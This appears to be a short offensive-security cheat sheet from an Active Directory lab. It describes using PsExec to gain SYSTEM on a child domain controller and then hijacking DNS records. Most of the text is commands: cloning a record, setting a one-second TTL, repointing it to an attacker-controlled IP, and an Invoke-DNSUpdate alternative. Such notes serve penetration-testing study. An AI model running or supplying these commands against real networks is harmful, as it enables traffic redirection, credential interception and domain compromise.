## Local

Get SYSTEM first on any child DC...

 `.\PsExec64.exe -s -i -accepteula powershell.exe`

View all DNS records and decide which one to attack:

```
Get-DnsServerResourceRecord -ComputerName DC01.domain.local -ZoneName inlanefreight.ad -Name "@"
```

  
```
$TOPLEVEL_DC_FQDN = DC01.domain.local

$Old = Get-DnsServerResourceRecord -ComputerName $TOPLEVEL_DC_FQDN -ZoneName domain.local -Name TARGET01 

$New = $Old.Clone() PS C:\Tools> $TTL = [System.TimeSpan]::FromSeconds(1) 

$New.TimeToLive = $TTL 

$New.RecordData.IPv4Address = [System.Net.IPAddress]::parse('192.168.1.11') 

Set-DnsServerResourceRecord -NewInputObject $New -OldInputObject $Old -ComputerName $TOPLEVEL_DC_FQDN -ZoneName domain.local

Get-DnsServerResourceRecord -ComputerName DC01.inlanefreight.ad -ZoneName inlanefreight.ad -Name "@"
```

  **Alternative  (if the zone allows secure dynamic updates)**:

This sets the DEV01 record to point to the DC record it is called from (same as `nsupdate` on Linux):

```
PS C:\Tools> Invoke-DNSUpdate -DNSName DEV01 
```

